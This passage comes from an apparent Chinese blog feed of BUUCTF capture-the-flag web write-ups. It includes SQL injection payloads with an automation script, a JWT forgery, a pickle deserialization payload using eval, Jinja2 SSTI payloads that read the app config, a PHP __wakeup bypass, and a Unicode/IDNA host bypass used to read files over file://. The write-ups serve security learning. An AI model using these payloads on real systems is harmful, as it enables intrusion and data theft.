alt=""></p><p>最后找到<code>mysql.innodb_index_stats</code>表</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217134025.png" alt=""></p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_index_stats<span class="comment">/**/</span>where<span class="comment">/**/</span>database_name=schema()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'<span class="number">0.6139996297990679</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217134107.png" alt=""></p><p>得到了表名<code>users</code>，但列名没法查出来，只能无列名注入了</p><p>经过测试得到<code>users</code>有三个列</p><p>然后老套路子查询注入</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217135801.png" alt=""></p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>`<span class="number">3</span>`<span class="comment">/**/</span>from<span class="comment">/**/</span>(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>*<span class="comment">/**/</span>from<span class="comment">/**/</span>users)a<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'<span class="number">0.4236117591863676</span></span><br></pre></td></tr></table></figure><p>上面为查询<code>flag</code>语句</p><p>最后附上我的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">session = requests.session()</span><br><span class="line">all_url = <span class="string">"http://09ccff60-a99c-4fe8-bc1e-a95e62c7826b.node3.buuoj.cn/"</span></span><br><span class="line">register_url = all_url+<span class="string">"register.php"</span></span><br><span class="line">login_url = all_url+<span class="string">"login.php"</span></span><br><span class="line">ad_url = all_url+<span class="string">"addads.php"</span></span><br><span class="line">index_url = all_url+<span class="string">"index.php"</span></span><br><span class="line">user = str(random.random())</span><br><span class="line">register_data = &#123;</span><br><span class="line"><span class="string">'username'</span>: user,</span><br><span class="line"><span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line"><span class="string">'ac'</span>: <span class="string">'register'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=register_url,data=register_data)</span><br><span class="line">login_data = &#123;</span><br><span class="line"><span class="string">'username'</span>: user,</span><br><span class="line"><span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line"><span class="string">'ac'</span>: <span class="string">'login'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=login_url,data=login_data)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">payload = <span class="string">"-1'union/**/select/**/1,&#123;&#125;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#123;&#125;'&#123;&#125;"</span>.format(input(<span class="string">"Payload[1]:"</span>),input(<span class="string">"Payload[2]:"</span>),str(random.random())).replace(<span class="string">" "</span>,<span class="string">"/**/"</span>)</span><br><span class="line">print(payload)</span><br><span class="line">preg_0 = re.compile(<span class="string">"待管理确认&lt;/td&gt;&lt;td&gt;&lt;button type='button'&gt;&lt;a href='(.*?)'&gt;"</span>)</span><br><span class="line">ad_data = &#123;</span><br><span class="line"><span class="string">'title'</span>: payload,</span><br><span class="line"><span class="string">'content'</span>: <span class="string">'3213'</span>,</span><br><span class="line"><span class="string">'ac'</span>: <span class="string">'add'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">state = session.post(url=ad_url,data=ad_data).text</span><br><span class="line">print(<span class="string">"申请状态:"</span>+state)</span><br><span class="line">index = session.get(url=index_url).text</span><br><span class="line">detail_url = all_url+preg_0.findall(index)[<span class="number">-1</span>]</span><br><span class="line">s = session.get(url=detail_url).text</span><br><span class="line">preg_1 = re.compile(<span class="string">"&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;&lt;td&gt;"</span>)</span><br><span class="line">error_preg = re.compile(<span class="string">"&lt;font color='red'&gt;(.*?)&lt;/font&gt;"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">error = error_preg.findall(s)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"捕捉错误:"</span>+error)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">show = preg_1.findall(s)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"回显:"</span>+show)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217162758.png" alt=""></p><p>打开看到注释，提示到编码<code>UTF-8</code>并且题目名字和<code>Unicode</code>有关</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163007.png" alt=""></p><p>买1、2、3号商品，会提示</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163107.png" alt=""></p><p>买4号商品，输入个位数会提示钱不够</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163128.png" alt=""></p><p>输入1337会提示只能输入一个字符</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163203.png" alt=""></p><p>不输入价格直接提交会爆错</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163254.png" alt=""></p><p>这里采用了<code>numeric</code>函数，得到输入值的的<code>numeric value</code></p><p>那么能不能找到一个<code>Unicode</code>，让他的<code>numeric value</code>大于<code>1337</code>即可</p><p><a href="https://www.compart.com/en/unicode/search?q=ten+thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=ten+thousand#characters</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217164220.png" alt=""></p><p>直接提交这个字符即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217164404.png" alt=""></p><p>很有趣的编码题</p><p>相关链接：</p><p><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">浅谈Unicode设计的安全性</a></p><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217170821.png" alt=""></p><p>提示要买到<code>LV6</code>，但这里翻了几页没找到了<code>LV6</code>，而且使用<code>requests</code>库会出现<code>403</code>问题</p><p>这里直接用<code>selenium</code>来找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">chrome_opt = Options()</span><br><span class="line">chrome_opt.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">chrome_opt.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">driver = webdriver.Chrome(chrome_options=chrome_opt)</span><br><span class="line"><span class="keyword">for</span> id <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999</span>):</span><br><span class="line">    print(id)</span><br><span class="line">    url = <span class="string">"http://365191b5-4640-4366-9d70-ab92268e6a31.node3.buuoj.cn/shop?page=&#123;&#125;"</span>.format(id)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    content = driver.page_source</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/static/img/lv/lv6.png"</span> <span class="keyword">in</span> content:</span><br><span class="line">        print(url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217170942.png" alt=""></p><p>最后找到在<code>181</code>页</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171048.png" alt=""></p><p>但好像比较贵，注册的新账号只有1000块钱</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171035.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171148.png" alt=""></p><p>这里购买的时候抓包一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171225.png" alt=""></p><p>这个应该就是折扣，我们修改成0.000000001</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171300.png" alt=""></p><p>然后发过去发现页面只容许<code>admin</code>访问….</p><p>但这里看到存在<code>JWT</code></p><p>先把自己的解密一下看看</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171608.png" alt=""></p><p>剩下的部分由于存在秘钥，所以看不到，得解密</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217173840.png" alt=""></p><p>解密得到秘钥<code>1Kun</code></p><p>伪造得到<code>admin</code>的<code>JWT</code></p><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174039.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174230.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174431.png" alt=""></p><p>得修改两次</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174652.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174639.png" alt=""></p><p>查看<code>HTML源码</code>得到源代码</p><p>在<code>Admin.py</code>文件中存在<code>pickle</code>反序列化漏洞</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217175404.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217181738.png" alt=""></p><p>这里最重要一点是，反序列化需要反序列化那个文件中存在那个库，这样才能调用，否则是不可以的</p><p>因此上面那个<code>payload</code>在远程是大不了的</p><p>而且反序列化需要用<code>python2</code>来运行，用<code>python3</code>运行的结果不一样，传过去也没效果<br>这里采用<code>__reduce__</code>第二中方式</p><p>第一个参数传入一个可被调用的方法，</p><p>第二个参数传入可被第一个参数调用的参数，所以这里实际上执行的是:</p><p><code>eval(&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;)</code></p><p>最终的<code>payload</code>为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">aa = payload()</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">s = pickle.loads(a)</span><br><span class="line">print(a)</span><br><span class="line">print(urllib.quote(a))</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217182951.png" alt=""></p><p>把运行结果传入<code>become</code>参数，即可得到<code>flag</code></p><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>打开界面得到源代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> open(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span> </span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>) </span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>又是模板注入<code>SSTI</code></p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">SSTI目的无非就是两个：文件读写、getshell。因此我们核心应该放在<span class="built_in">file</span>类和os类</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217200408.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217183709.png" alt=""></p><p>这道题过滤了括号，这种没做过，找到<code>writeup</code>学习了一下</p><p><a href="https://ctftime.org/writeup/10895" target="_blank" rel="noopener">https://ctftime.org/writeup/10895</a></p><p><a href="https://gitlab.com/mahham/ctf/blob/master/2018-twctf/Readme.md#shrine-190-web" target="_blank" rel="noopener">官网writeup</a></p><p>这篇<code>writeup</code>总结的特别好</p><p>对于这种情况一般只有内置函数才能解决</p><p>对<code>SSTI</code>不是很了解，尤其内置类，所以这就先不分析了，找个时间专门学习一下</p><ul><li><code>get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code></li><li><code>url_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code></li><li><code>g.__repr__.__func__.__globals__._app_ctx_stack.top.app.config</code></li><li><code>app.__init__.__globals__.sys.modules.app.app.__dict__</code></li></ul><p>以上都可以读到<code>flag</code></p><p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p><p><a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener">Python模板注入(SSTI)深入学习</a></p><p><a href="https://www.cnblogs.com/-qing-/p/11656544.html" target="_blank" rel="noopener">python-Flask模版注入攻击SSTI(python沙盒逃逸)</a></p><p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p><a href="https://www.jianshu.com/p/fea23f17d497" target="_blank" rel="noopener">SSTI bypass 总结</a></p><p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">探索Flask/Jinja2中的服务端模版注入（二）</a></p><p><a href="[https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/](https://evi0s.com/2018/11/26/深入ssti-从nctf2018两道flask看bypass新姿势/)">深入SSTI-从NCTF2018两道Flask看bypass新姿势</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目列表：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[极客大挑战 2019]BuyFlag&lt;/li&gt;
&lt;li&gt;[GXYCTF2019]Ping Ping Ping&lt;/li&gt;
&lt;li&gt;[安洵杯 2019]easy_web&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]BabySQL&lt;/li&gt;
&lt;li&gt;[SWPU2019]Web1&lt;/li&gt;
&lt;li&gt;[ASIS 2019]Unicorn shop&lt;/li&gt;
&lt;li&gt;[CISCN2019 华北赛区 Day1 Web2]ikun&lt;/li&gt;
&lt;li&gt;[WesternCTF2018]shrine&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://a2u13.com/categories/CTF/"/>
    
    
      <category term="BUUCTF" scheme="https://a2u13.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题笔记（三）</title>
    <link href="https://a2u13.com/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-02-13T13:53:05.000Z</published>
    <updated>2020-06-07T06:50:29.676Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p><p><strong>题目列表：</strong></p><ul><li>[极客大挑战 2019]PHP</li><li>[极客大挑战 2019]Knife</li><li>[SUCTF 2019]Pythonginx</li><li>[BUUCTF 2018]Online Tool</li><li>[极客大挑战 2019]Http</li><li>[极客大挑战 2019]LoveSQL</li><li>[ZJCTF 2019]NiZhuanSiWei</li><li>[CISCN2019 华北赛区 Day1 Web1]Dropbox</li></ul><a id="more"></a><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213220458.png" alt=""></p><p>直接盲猜备份文件为<code>www.zip</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213220556.png" alt=""></p><p>然后发现是假的。。。</p><p>查看<code>index.php</code>的代码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213221006.png" alt=""></p><p>看到<code>class.php</code>文件代码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213220727.png" alt=""></p><p>主要考了反序列化以及<code>__wakeup</code>的绕过</p><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">php反序列化漏洞绕过魔术方法 __wakeup</a></p><p>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p><p><code>O:6:&quot;sercet&quot;:1:</code>也就是输入比<code>1</code>大的值就行  如<code>O:6:&quot;sercet&quot;:2:</code></p><p>首先生成序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"Nameusername"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"Namepassword"</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后修改成员个数大于<code>2</code>即可</p><p>最后传过去即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213221908.png" alt=""></p><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213222608.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213222618.png" alt=""></p><p>背景是黑的差点以为做错了。。。</p><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>打开看到题目源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><p>这道题原型来自于<code>BlackHat</code>议会的一个分享</p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214140438.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214140512.png" alt=""></p><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</a></p><p><a href="https://towardsdatascience.com/difference-between-nfd-nfc-nfkd-and-nfkc-explained-with-python-code-e2631f96ae6c" target="_blank" rel="noopener">Difference Between NFD, NFC, NFKD, and NFKC Explained with Python Code</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214141415.png" alt=""></p><p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">CVE-2019-10160：urlsplit NFKD 标准化漏洞</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214141443.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214141801.png" alt=""></p><p>大致意思是<code>urlsplit</code>函数不处理<code>NFKC</code>标准化的字符，如果存在<code>NFKC</code>标准化字符的话，他会对字符不再处理</p><p>对于这道题而言，如果传入的<code>url</code>为<code>http://suctf.c℆</code>时，<code>urlsplit</code>函数会认为传入的<code>host</code>部分为<code>suctf.c</code>从而绕过前面的两个<code>host</code>不能为<code>suctf.cc</code>的限制</p><p>然后在<code>IDNA</code>编码的作用下重新变成<code>http://suctf.cc/u</code>，满足<code>host=suctf.cc</code>的条件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214142344.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里找到别人写的脚本，可以从所有的<code>unicode</code>以及他的<code>IDNA</code>编码形式的字符</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214144824.png" alt=""></p><p>这道题提到了<code>nginx</code>应该是要我们来读<code>nginx</code>的配置文件，而且提到了不要为<code>suctf.cc</code>担心</p><p>猜测存在<code>根目录/suctf.cc/...........</code>的目录存在或者别名之类的</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br><span class="line">配置文件目录为：<span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/nginx/</span>conf/nginx.conf</span><br></pre></td></tr></table></figure><p>这里得靠<code>file</code>协议来读配置文件内容</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214145227.png" alt=""></p><p>读到了<code>flag</code>的位置，直接读到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214145317.png" alt=""></p><p><strong>这道题在比赛中的时候，是当时<code>Black Hat</code>议会的一个内容，以及<code>python-CVE</code>，想做出来这道题的话，得多关注最近的安全议会的内容，多总结和学习，这样才能不落后，不学习题都做不来…….</strong></p><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = 